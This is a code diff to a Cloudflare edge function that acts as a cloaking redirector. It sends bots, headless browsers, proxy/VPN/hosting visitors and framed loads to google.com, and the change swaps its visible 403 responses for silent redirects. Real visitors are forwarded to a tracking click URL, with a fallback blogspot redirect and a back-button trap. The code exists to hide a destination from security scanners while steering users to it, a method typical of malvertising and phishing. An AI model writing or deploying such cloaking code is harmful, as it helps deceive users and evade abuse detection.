@@ -15,15 +15,20 @@ export async function onRequest(context) {
   // 2. Block Cloudflare-detected bots
   const isBot = request.headers.get("cf-is-bot") === "true";
   if (isBot) {
-    return new Response("Blocked: Bot detected", { status: 403 });
+    return Response.redirect("https://google.com", 302);
   }
 
   // 3. Fetch from ip-api.com
-  const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,proxy,hosting,mobile`);
-  const data = await geoRes.json();
+  let data = {};
+  try {
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,proxy,hosting`);
+    data = await geoRes.json();
+  } catch (e) {
+    return Response.redirect("https://redrect22.blogspot.com/", 302); // fallback redirect if API fails
+  }
 
-  if (data.status !== "success" || data.proxy  || data.hosting || data.mobile) {
-    return new Response("Access Denied: Proxy/VPN/Hosting detected.", { status: 403 });
+  if (data.status !== "success" || data.proxy || data.hosting) {
+    return Response.redirect("https://google.com", 302);
   }
 
   // 4. HTML Response
@@ -32,7 +37,7 @@ export async function onRequest(context) {
     <html>
     <head>
       <meta charset="UTF-8">
-      <title>IP Info</title>
+      <title>Redirect...</title>
       <script>
         // Block iframe
         if (window !== window.top) {
@@ -40,7 +45,7 @@ export async function onRequest(context) {
         }
 
         // Headless detection
-        const isHeadless = navigator.webdriver || !navigator.plugins.length || !navigator.languages.length;
+        const isHeadless = navigator.webdriver || !navigator.plugins.length || !navigator.languages.length  || /HeadlessChrome/.test(navigator.userAgent);
         if (isHeadless) {
           window.location.href = "https://google.com";
         }
@@ -72,7 +77,7 @@ export async function onRequest(context) {
         } else {
           setTimeout(() => {
             window.location.href = "https://z9nuz.bemobtrcks.com/click";
-          }, 200); // delay untuk validasi
+          }, 200);
         }
 
         // Refresh/back button trap
